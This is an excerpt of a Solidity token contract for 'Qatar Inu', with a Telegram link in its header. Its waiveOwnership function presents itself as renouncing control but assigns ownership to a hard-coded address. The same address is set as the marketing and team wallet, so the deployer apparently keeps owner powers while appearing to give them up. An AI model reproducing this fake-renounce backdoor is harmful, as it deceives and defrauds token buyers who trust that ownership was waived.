...
/**
Telegram : https://t.me/qatar_inubsctoken
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x915f4e8aeFaf04201EA920AED65F6913D9E67B21);
    }
...
contract qatarinu is Context, IERC20, Ownable {
    ...
    string private _name = "Qatar Inu";
    string private _symbol = "qatarinu";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x915f4e8aeFaf04201EA920AED65F6913D9E67B21);
    address payable private teamWalletAddress = payable(0x915f4e8aeFaf04201EA920AED65F6913D9E67B21);
